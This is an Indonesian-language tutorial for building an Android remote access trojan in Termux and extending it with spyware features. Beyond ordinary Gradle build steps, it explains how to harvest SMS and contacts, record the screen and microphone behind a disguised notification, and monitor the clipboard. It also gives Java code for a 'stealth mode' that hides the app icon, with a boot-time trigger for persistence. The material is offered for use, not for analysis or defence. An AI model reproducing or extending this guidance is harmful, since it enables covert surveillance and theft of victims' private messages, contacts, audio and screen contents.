# Tutorial Build Aplikasi Android RAT di Termux

Dokumen ini adalah panduan langkah demi langkah untuk meng-compile (build) source code sampel Android RAT menjadi file `.apk` yang bisa diinstal. Semua proses ini dilakukan di dalam [Termux](https://termux.com/) di perangkat Android Anda.

**Penting:** Anda memerlukan koneksi internet yang stabil dan ruang penyimpanan yang cukup (sekitar 1-2 GB) karena proses ini akan mengunduh banyak file.

## Langkah 1: Persiapan Lingkungan di Termux

Buka Termux dan jalankan perintah-perintah berikut satu per satu untuk menginstal semua alat yang diperlukan.

1.  **Update & Upgrade Paket:**
    ```bash
    pkg update && pkg upgrade
    ```

2.  **Instal OpenJDK-17 (Java Development Kit):**
    Gradle memerlukan Java untuk berjalan. Kita akan menginstal OpenJDK versi 17.
    ```bash
    pkg install openjdk-17
    ```

3.  **Instal Git (untuk meng-clone proyek):**
    ```bash
    pkg install git
    ```

## Langkah 2: Mengunduh Source Code

1.  **Clone Proyek Ini:**
    Anda perlu meng-clone repositori yang berisi bot dan source code sampel Android.
    ```bash
    git clone <URL_REPOSITORI_ANDA>
    ```
    Ganti `<URL_REPOSITORI_ANDA>` dengan URL Git dari proyek Anda.

2.  **Masuk ke Direktori Proyek:**
    Setelah selesai, masuk ke direktori source code Android.
    ```bash
    cd nama-repositori-anda/android_rat_source
    ```

## Langkah 3: Melakukan Build Aplikasi

Sekarang Anda berada di direktori yang benar dan semua alat sudah terinstal.

1.  **Memberikan Izin Eksekusi pada Gradle Wrapper:**
    Skrip `gradlew` perlu izin agar bisa dijalankan.
    ```bash
    chmod +x ./gradlew
    ```

2.  **Menjalankan Proses Build:**
    Gunakan Gradle Wrapper untuk memulai proses build. Perintah ini akan secara otomatis mengunduh versi Gradle yang sesuai dan semua dependensi yang diperlukan, lalu meng-compile kode menjadi file `.apk`.
    ```bash
    ./gradlew assembleDebug
    ```
    Proses ini mungkin akan memakan waktu cukup lama (bisa 5-15 menit atau lebih) saat pertama kali dijalankan, tergantung pada kecepatan internet dan perangkat Anda. Harap bersabar.

## Langkah 4: Menemukan File .apk

Jika proses build berhasil, Anda akan melihat pesan `BUILD SUCCESSFUL` di akhir output.

File `.apk` yang sudah jadi akan berada di direktori berikut:

`app/build/outputs/apk/debug/app-debug.apk`

Anda bisa menavigasi ke sana atau menyalinnya ke direktori lain menggunakan perintah:

```bash
cp app/build/outputs/apk/debug/app-debug.apk ~/storage/downloads/
```

Perintah di atas akan menyalin file `app-debug.apk` ke folder "Downloads" di penyimpanan internal ponsel Anda, sehingga lebih mudah ditemukan dan diinstal.

## Langkah 5: Mengembangkan Lebih Lanjut

Source code yang diberikan adalah kerangka dasar. Untuk menambahkan fungsionalitas penuh (seperti mengambil SMS, kontak, rekam layar, dll.), Anda perlu mengedit file-file Java di dalam direktori `app/src/main/java/com/example/androidrat/` menggunakan editor teks (seperti `nano` atau `vim` di Termux, atau editor kode di PC).

Setiap kali Anda mengubah kode, Anda hanya perlu kembali ke direktori `android_rat_source` dan menjalankan kembali perintah `./gradlew assembleDebug` untuk membuat `.apk` versi baru.

## Langkah 6: Konsep Implementasi Fitur

Berikut adalah beberapa petunjuk dan konsep untuk mengimplementasikan fitur-fitur yang diinginkan di dalam file `MainActivity.java` atau di dalam sebuah `Service`.

### Mendapatkan SMS & Kontak
- **API:** Gunakan `ContentResolver` untuk melakukan query ke `Telephony.Sms.CONTENT_URI` untuk SMS dan `ContactsContract.CommonDataKinds.Phone.CONTENT_URI` untuk kontak.
- **Izin:** Pastikan izin `READ_SMS` dan `READ_CONTACTS` sudah ada di `AndroidManifest.xml` dan diminta saat runtime jika target Android versi 6.0 (Marshmallow) ke atas.

### Merekam Layar (Screen Record)
- **API:** Ini adalah fitur yang paling kompleks. Anda akan memerlukan `MediaProjectionManager` untuk mendapatkan izin dari pengguna untuk merekam layar.
- **Foreground Service:** Proses perekaman harus dijalankan di dalam sebuah `Foreground Service` agar tidak dimatikan oleh sistem. Service ini akan menampilkan notifikasi permanen (yang bisa disamarkan) selama perekaman berlangsung.
- **MediaRecorder:** Gunakan kelas `MediaRecorder` untuk mengkonfigurasi sumber video (dari `MediaProjection`), output format, encoder, dan file tujuan.
- **Izin:** `FOREGROUND_SERVICE`, `RECORD_AUDIO`.

### Merekam Mikrofon (Mic Record)
- **API:** Sama seperti rekam layar, gunakan `MediaRecorder`. Namun, sumber audionya adalah `MediaRecorder.AudioSource.MIC`.
- **Izin:** `RECORD_AUDIO`.

### Mengambil Clipboard
- **API:** Gunakan `ClipboardManager` untuk mengakses data clipboard.
- **Listener:** Anda bisa membuat `ClipboardManager.OnPrimaryClipChangedListener` untuk mendapatkan notifikasi setiap kali clipboard berubah. Ini biasanya dilakukan di dalam sebuah `Service` yang berjalan di latar belakang.

### Mode Siluman (Stealth Mode)
- **API:** Gunakan `PackageManager` untuk menonaktifkan komponen `MainActivity` setelah aplikasi pertama kali dijalankan.
  ```java
  PackageManager p = getPackageManager();
  ComponentName componentName = new ComponentName(this, com.example.androidrat.MainActivity.class);
  p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
  ```
- **Pemicu:** Aplikasi perlu cara lain untuk dipicu setelah ikonnya disembunyikan, misalnya melalui broadcast receiver yang merespons event sistem seperti boot (`BOOT_COMPLETED`) atau koneksi internet.
